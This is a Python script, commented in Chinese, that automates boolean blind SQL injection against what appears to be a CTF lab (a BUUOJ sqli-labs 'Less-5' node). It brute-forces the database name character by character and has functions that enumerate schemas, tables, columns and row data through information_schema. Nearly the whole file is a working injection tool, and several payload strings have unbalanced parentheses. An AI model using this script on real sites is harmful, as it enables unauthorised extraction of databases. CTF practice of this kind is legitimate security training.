import requests

myurl = "http://1b34069a-eade-4d42-98b4-972f4211b841.node3.buuoj.cn/Less-5/?id=1' and $%23"
mykey = "You are in..........."
charset = ",{{}}abcdefghijklmnopqrstuvwxyz.!@$%^*():/1234567890_#"

url = ["","",""]
SuccessKey = ""

def init():
    print("自动布尔盲注脚本，需要输入URL，payload位置和成功页面特点。")
    print("请输入待测试URL，其中payload使用$来标识。")
    print("例如：http://www.test.com/?id=1' and $%23")
    print("请确保手动注入测试成功，再使用脚本爆破。")

    while True:
        url[0] = myurl#input(">url = ")
        if '$' not in url[0]:
            print("没有指出payload的位置。")
            continue
        else:
            break

    url[1],url[2] = url[0].split("$")
    global SuccessKey
    print("接下来输入页面成功的标识，请确保这个字串是唯一的。")
    print("以后会添加更多关于标识的判断。")
    SuccessKey = mykey#input(">SuccessKey = ")

#要在其他函数之前测试一下连接。
def TestConn():
    flags = [False,False,False]
    def TestConnSucc():
        try:
            resp = requests.get(url[1]+"1=1"+url[2])
            return resp
        except Exception as e:
            print(e)
            return None

    def TestConnFail():
        try:
            resp = requests.get(url[1]+"1=2"+url[2])
            return resp
        except Exception as e:
            print(e)
            return None

    RespSucc = TestConnSucc()
    RespFail = TestConnFail()

    if RespFail is None or RespSucc is None:
        print("不能建立与url的连接！")
        flags[0] = False
    else:
        flags[0] = True

    if SuccessKey in RespSucc.text:
        print("成功条件测试成功")
        flags[1] = True

    if SuccessKey not in RespFail.text:
        print("失败条件测试成功")
        flags[2] = True
    else:
        print("失败和成功判断是一样的！请修改识别的关键字")
        print(SuccessKey)

    return flags[0] and flags[1] and flags[2]

def TestPayload(payload):
    test_url = (url[1]+payload+url[2])
    #print("test_url: "+test_url)
    resp = requests.get(test_url)
    if SuccessKey in resp.text:
        return True
    else:
        return False

def getCurrentDatabaseName():
    print("正在获取数据库的长度和名称...")
    global charset
    get_len_payload = "length(database())="
    get_name_payload = "left(database(),$)="
    length = 1
    while length < 30:
        if TestPayload(get_len_payload+str(length)) is True:
            break
        else:
            length += 1
    if length == 30:
        print("数据库名称太长，或者程序出现错误了。")
        exit(0)
    print("现在使用的数据库长度："+str(length))

    name = ""
    payl = get_name_payload.split("$")
    for i in range(1,length+1):
        for j in charset:
            if j is '#':
                print("数据库的名字不在字符集中！")
                exit(0)

            full_payload = payl[0]+str(i)+payl[1]+"'"+name+j+"'"
            if TestPayload(full_payload) is True:
                name += j
                break
        print("name: "+name) 
    return name

def getDatabases(maxlen=30):
    global charset
    get_len_payload = ("length(select group_concat(schema_name) from information_schema.schemata)=")
    get_name_payload = ("left((select group_concat(schema_name) from information_schema.schemata),$)=")
    length = 1
    while length < maxlen:
        if TestPayload(get_len_payload+str(length)) is True:
            break
        else:
            length += 1
    if length == maxlen:
        print("数据库总名称太长，或者程序出现错误了。") 
    print("所有数据库名和逗号的总长度："+str(length))

    name = ""
    payl = get_name_payload.split("$")
    for i in range(1,length+1):
        for j in charset:
            if j is '#':
                print("数据库的名字不在字符集中！")
                exit(0)
            full_payload = payl[0]+str(i)+payl[1]+"'"+name+j+"'"
            print(full_payload)
            if TestPayload(full_payload) is True:
                name += j
                break
        print("names: "+name) 
    return name.split(",")

def getTables(database,maxlen=30):
    global charset
    get_len_payload = ("length((select group_concat(table_name) from information_schema.tables where table_schema='"+database+"')=")
    get_name_payload = ("left((select group_concat(table_name) from information_schema.tables where table_schema='"+database+"'),$)=")
    length = 1
    while length < maxlen:
        if TestPayload(get_len_payload+str(length)) is True:
            break
        else:
            length += 1
    if length == maxlen:
        print("表名称太长，或者程序出现错误了。") 
    print("所有表名和逗号的总长度："+str(length))

    name = ""
    payl = get_name_payload.split("$")
    for i in range(1,length+1):
        for j in charset:
            if j is '+':
                print("列的名字不在字符集中！")
                exit(0)
            full_payload = payl[0]+str(i)+payl[1]+"'"+name+j+"'"
            #print(full_payload)
            if TestPayload(full_payload) is True:
                name += j
                break
        print("names: "+name) 
    return name.split(",")

def getColumns(table,maxlen=40):
    global charset
    get_len_payload = ("length((select group_concat(column_name) from information_schema.columns where table_name='"+table+"')=")
    get_name_payload = ("left((select group_concat(column_name) from information_schema.columns where table_name='"+table+"'),$)=")
    length = 1
    while length < maxlen:
        if TestPayload(get_len_payload+str(length)) is True:
            break
        else:
            length += 1
    if length == maxlen:
        print("列名称太长，或者程序出现错误了。") 
    print("所有列名和逗号的总长度："+str(length))

    name = ""
    payl = get_name_payload.split("$")
    for i in range(1,length+1):
        for j in charset:
            if j is '#':
                print("列的名字不在字符集中！")
                exit(0)
            full_payload = payl[0]+str(i)+payl[1]+"'"+name+j+"'"
            #print(full_payload)
            if TestPayload(full_payload) is True:
                name += j
                break
        print("names: "+name) 
    return name.split(",")

def getrows(database,table,column,maxlen=50):
    global charset
    get_len_payload = ("length((select group_concat('"+column+"') from "+database+"."+table+")=")
    get_name_payload = ("left((select group_concat('"+column+"') from "+database+"."+table+"),$)=")
    length = 1
    while length < maxlen:
        if TestPayload(get_len_payload+str(length)) is True:
            break
        else:
            length += 1
    if length == maxlen:
        print("字段名称太长，或者程序出现错误了。") 
    print("所有字段和逗号的总长度："+str(length))

    name = ""
    payl = get_name_payload.split("$")
    for i in range(1,length+1):
        for j in charset:
            if j is '#':
                print("字段的名字不在字符集中！")
                exit(0)
            full_payload = payl[0]+str(i)+payl[1]+"'"+name+j+"'"
            #print(full_payload)
            if TestPayload(full_payload) is True:
                name += j
                break
        print("names: "+name) 
    return name.split(",")

def __main__():
    init()
    if TestConn():
        getCurrentDatabaseName()
        #getDatabases()
        #tbl = getTables("ctftraining")
        #getColumns("ctftraining","flag")
        #getrows("ctftraining","flag","flag")
        #?识别不了大括号吗
        
if __name__ == "__main__":
    __main__()